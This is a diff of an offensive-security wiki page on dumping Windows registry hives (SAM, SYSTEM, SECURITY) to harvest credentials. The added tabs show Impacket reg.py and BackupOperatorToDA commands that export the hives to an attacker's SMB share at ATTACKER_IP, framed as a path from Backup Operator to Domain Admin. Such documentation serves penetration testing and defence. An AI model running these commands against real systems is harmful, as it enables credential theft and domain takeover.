@@ -28,6 +28,29 @@ SAM and LSA secrets can be dumped either locally or remotely from the mounted re
 
 ### Exfiltration
 
+{% tabs %}
+{% tab title="UNIX-like" %}
+[Impacket](https://github.com/SecureAuthCorp/impacket)'s reg.py (Python) script can also be used to do the same operation remotely for a UNIX-like machine. For instance, this can be used to easily escalate from a [Backup Operator](../../builtin-groups.md) member to a Domain Admin by dumping a Domain Controller's secrets and use them for a [DCSync](dcsync.md). _(At the time of writing, 17th Feb. 2022,_ [_the pull request_](https://github.com/SecureAuthCorp/impacket/pull/1257) _is pending)._
+
+{% hint style="success" %}
+The attacker can start an SMB server, and indicate an UNC path including his IP address so that the hives get exported directly to his server.
+{% endhint %}
+
+```bash
+# start an SMB share
+smbserver.py -smb2support "someshare" "./"
+
+# save each hive manually
+reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o '\\ATTACKER_IPs\someshare'
+reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\someshare'
+reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\someshare'
+
+# backup all SAM, SYSTEM and SECURITY hives at once
+reg.py "domain"/"user":"password"@"target" backup -o '\\ATTACKER_IP\someshare'
+```
+{% endtab %}
+
+{% tab title="Live Windows" %}
 When the Windows operating system is running, the hives are in use and mounted. The command-line tool named `reg` can be used to export them.
 
 ```bash
@@ -36,14 +59,22 @@ reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
 reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
 ```
 
-[Impacket](https://github.com/SecureAuthCorp/impacket)'s reg.py (Python) script can also be used to do the same operation remotely for a UNIX-like machine. For instance, this can be used to easily escalate from a [Backup Operator](../../builtin-groups.md) member to a Domain Admin by dumping a Domain Controller's secrets and use them for a [DCSync](dcsync.md). _(At the time of writing, 17th Feb. 2022,_ [_the pull request_](https://github.com/SecureAuthCorp/impacket/pull/1257) _is pending)._
+This operation can be conducted remotely with [BackupOperatoToDA](https://github.com/mpgn/BackupOperatorToDA) (C++).
+
+{% hint style="success" %}
+The attacker can start an SMB server, and indicate an UNC path including his IP address so that the hives get exported directly to his server.
+{% endhint %}
 
 ```bash
-reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o '\\192.168.56.1\someshare'
-reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\someshare'
-reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\someshare'
+BackupOperatorToDA.exe -d "domain" -u "user" -p "password" -t "target" -o "\\ATTACKER_IP\someshare"
 ```
 
+{% hint style="info" %}
+Alternatively, from a live Windows machine, the hive files can also be exfiltrated using [Volume Shadow Copy](ntds.md#volume-shadow-copy-vssadmin) like demonstrated for an NTDS export.
+{% endhint %}
+{% endtab %}
+
+{% tab title="Down Windows" %}
 When Windows is not running, the hives are not mounted and they can be copied just like any other file. This can be operated when mounting the hard drive from another OS (e.g. when booting the computer on another operating system). The hive files can be found at the following locations.
 
 ```bash
@@ -51,10 +82,8 @@ When Windows is not running, the hives are not mounted and they can be copied ju
 \system32\config\security
 \system32\config\system
 ```
-
-{% hint style="info" %}
-Hives files can also be exfiltrated from live systems using [Volume Shadow Copy](ntds.md#volume-shadow-copy-vssadmin).
-{% endhint %}
+{% endtab %}
+{% endtabs %}
 
 ### Secrets dump
 
